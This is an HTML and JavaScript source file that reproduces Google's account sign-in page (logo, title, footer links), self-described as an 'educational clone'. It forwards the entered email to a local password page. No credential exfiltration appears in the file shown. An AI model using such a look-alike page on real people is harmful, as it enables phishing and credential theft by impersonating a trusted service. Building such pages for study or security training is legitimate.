<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="x-icon" href="google.png" id="logo">
    <link rel="stylesheet" href="styles.css">
    <title>Sign in - Google Accounts</title>
</head>

<body>
    <main class="main_container">
        <div class="page">
        <div class="card">
            <div class="card-progress" id="progress" hidden></div>
            <div class="card-left">
                <!-- Google "G" logo (educational clone) -->
                <a href="https://www.google.com" class="brand-link" aria-label="Google">
                    <svg class="brand-logo" viewBox="0 0 48 48" aria-label="Google">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg>
                </a>

                <h1 class="title" data-i18n="title">Sign in</h1>
                <p class="subtitle" data-i18n="subtitle">Use your Google Account</p>
            </div>

            <div class="card-right">
                <form action="password.html" method="get">
                    <div class="text-field">
                        <input type="text" name="email" id="email" placeholder=" " autocomplete="off">
                        <label for="email" data-i18n="emailLabel">Email or phone</label>
                    </div>

                    <a href="recovery.html" class="link" id="forgot-email" data-i18n="forgotEmail">Forgot email?</a>

                    <p class="guest">
                        <span data-i18n="guest">Not your computer? Use Guest mode to sign in privately.</span>
                        <a href="https://support.google.com/chrome/answer/6130773?hl=pt-BR" class="link" data-i18n="guestLink" target="_blank" rel="noopener">Learn more about using Guest mode</a>
                    </p>

                    <div class="actions">
                        <div class="create-wrap">
                            <button type="button" class="btn-text" id="Create" data-i18n="createAccount" aria-haspopup="true" aria-expanded="false">Create account</button>
                            <div class="create-menu" id="createMenu" hidden>
                                <a href="#" class="create-item" data-i18n="createPersonal">For my personal use</a>
                                <a href="#" class="create-item" data-i18n="createChild">For my child</a>
                                <a href="#" class="create-item" data-i18n="createWork">For work or my business</a>
                            </div>
                        </div>
                        <button type="submit" class="btn-filled" id="next" data-i18n="next">Next</button>
                    </div>
                </form>
            </div>
        </div>

        <footer class="page-footer">
        <select name="language_bar" id="language" aria-label="Change language">
            <option value="en" selected>English (United States)</option>
            <option value="pt-BR">Português (Brasil)</option>
            <option value="es">Español (España)</option>
            <option value="fr">Français (France)</option>
            <option value="de">Deutsch</option>
            <option value="it">Italiano</option>
            <option value="ja">日本語</option>
            <option value="zh">简体中文</option>
        </select>

        <div class="footer-links">
            <a href="https://support.google.com/accounts?hl=pt-BR&p=account_iph" data-i18n="help" target="_blank" rel="noopener">Help</a>
            <a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR&privacy=true" data-i18n="privacy" target="_blank" rel="noopener">Privacy</a>
            <a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR" data-i18n="terms" target="_blank" rel="noopener">Terms</a>
        </div>
        </footer>
        </div>
    </main>

    <script src="translations.js"></script>
    <script>
        // The three "Create account" options all lead to Google's signup flow.
        const SIGNUP_URL = "https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com/search?q%3Dgoogle%2Blogin%2Bclone%26oq%3DGO%26gs_lcrp%3DEgZjaHJvbWUqBggAEEUYOzIGCAAQRRg7MgYIARBFGDkyBggCEEUYOzIGCAMQRRg8MgYIBBBFGDwyBggFEEUYPDIGCAYQRRg8MgYIBxBFGDzSAQgxMjE3ajBqN6gCALACAA%26sourceid%3Dchrome%26ie%3DUTF-8%26sei%3DSh0raubZMN2P5OUPkujS-Ag&dsh=S370668018:1781267266175531&ec=futura_srp_og_si_72236_p&flowEntry=SignUp&flowName=GlifWebSignIn&hl=pt-BR&ifkv=AcDsRvyC8z4klJryBSbsg56A_pBggu927nuKaPkLV7LxYE4HkeCGeRZutB1VbT7AqQ0fotQHUfvvkQ&TL=ADCchmacs7_EWydHYFM6awBvWDQCrBXIVm_JwwkqxPgi3YliFhHrQ7ZzLi_-z3c8";

        document.addEventListener("DOMContentLoaded", function () {
            // Point every "Create account" option to the signup URL
            document.querySelectorAll(".create-item").forEach(function (a) {
                a.href = SIGNUP_URL;
            });

            // Toggle the "Create account" dropdown
            const btn = document.getElementById("Create");
            const menu = document.getElementById("createMenu");
            btn.addEventListener("click", function (e) {
                e.stopPropagation();
                const open = menu.hidden;
                menu.hidden = !open;
                btn.setAttribute("aria-expanded", String(open));
            });
            document.addEventListener("click", function (e) {
                if (!menu.hidden && !menu.contains(e.target) && e.target !== btn) {
                    menu.hidden = true;
                    btn.setAttribute("aria-expanded", "false");
                }
            });

            // Pre-fill the email when coming back from the password screen
            const email = new URLSearchParams(window.location.search).get("email");
            if (email) {
                const input = document.getElementById("email");
                input.value = email;
            }

            // Loading-bar helper: show the bar, dim the form, then navigate after a beat.
            const LOADING_MS = 3000; // loading-bar duration (ms); set 5000 for ~5s
            const progress = document.getElementById("progress");
            function runLoadingThen(url) {
                progress.hidden = false;
                document.querySelector(".card").classList.add("is-loading");
                setTimeout(function () { window.location.href = url; }, LOADING_MS);
            }

            // On "Next": run the loading bar, then go to the password screen.
            document.querySelector("form").addEventListener("submit", function (e) {
                e.preventDefault();
                const value = document.getElementById("email").value.trim();
                runLoadingThen("password.html?email=" + encodeURIComponent(value));
            });

            // "Forgot email?" also runs the loading bar before going to recovery.
            document.getElementById("forgot-email").addEventListener("click", function (e) {
                e.preventDefault();
                runLoadingThen("recovery.html");
            });
        });
    </script>
</body>

</html>
